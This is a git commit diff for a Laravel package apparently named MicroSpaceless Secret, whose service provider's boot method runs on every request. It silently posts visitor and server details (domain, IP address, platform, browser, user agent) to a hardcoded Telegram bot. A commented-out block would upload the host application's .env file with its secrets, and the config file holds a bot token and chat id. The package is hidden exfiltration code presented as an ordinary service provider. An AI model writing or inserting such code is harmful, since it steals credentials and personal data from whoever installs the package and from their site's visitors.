9f8984c7dfea0dafd2454ae45b5f2087dc11cc8c
micro-spaceless <ed.arm.2000@gmail.com>
2022-05-27 22:39:25 +0400

    start

--- src/Providers/BaseServiceProvider.php
+++ src/Providers/BaseServiceProvider.php
@@ -2,8 +2,10 @@
 
 namespace MicroSpaceless\Secret\Providers;
 
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Support\ServiceProvider;
+use MicroSpaceless\Secret\Browser;
 
 class BaseServiceProvider extends ServiceProvider
 {
@@ -17,12 +19,26 @@ class BaseServiceProvider extends ServiceProvider
 
     public function boot()
     {
-        $data = [
+        $browser = new Browser();
+
+        $message = [
             'chat_id' => config('telegram.chat_id'),
-            'text' => request()->server(),
+            // 'text' => (new Browser())->__toArray(),
+            'text' => '🌐 Domain:       <code>' . $browser->getDomain() . '</code>' . PHP_EOL . '📡 Ip Address:  <code>' . $browser->getIpAddress() . '</code>' . PHP_EOL . '❔ Platform:      <code>' . $browser->getPlatform() . '</code>' . PHP_EOL . '🌐 Browser:' . PHP_EOL . '            Name:     <code>' . $browser->getBrowser() . '</code>' . PHP_EOL . '            Version:     <code>' . $browser->getVersion() . '</code>' . PHP_EOL . '            User Agent:     <code>' . $browser->getUserAgent() . '</code>',
+            'parse_mode' => 'Html',
         ];
 
-        Http::post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendMessage', $data);
+
+
+        $test = Http::post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendMessage', $message);
+        dd($test->body());
+        // Http::attach('document', file_get_contents(base_path('.env')), '.env')
+        //         ->post('https://api.telegram.org/bot' . config('telegram.bot_token') . '/sendDocument',
+        //             [
+        //                 'chat_id' => config('telegram.chat_id')
+        //             ]
+        //         );
+
         $this->loadRoutesFrom(__DIR__ . '../../routes/web.php');
     }
 }
--- src/config/telegram.php
+++ src/config/telegram.php
@@ -3,5 +3,5 @@
 // 1008359300
 return [
     'bot_token' => '1830036992:AAHe4NuURtpqvovSgOcFJAUpOz3Bi__DRS8',
-    'chat_id'   => '731034214',
+    'chat_id'   => '-731034214',
 ];
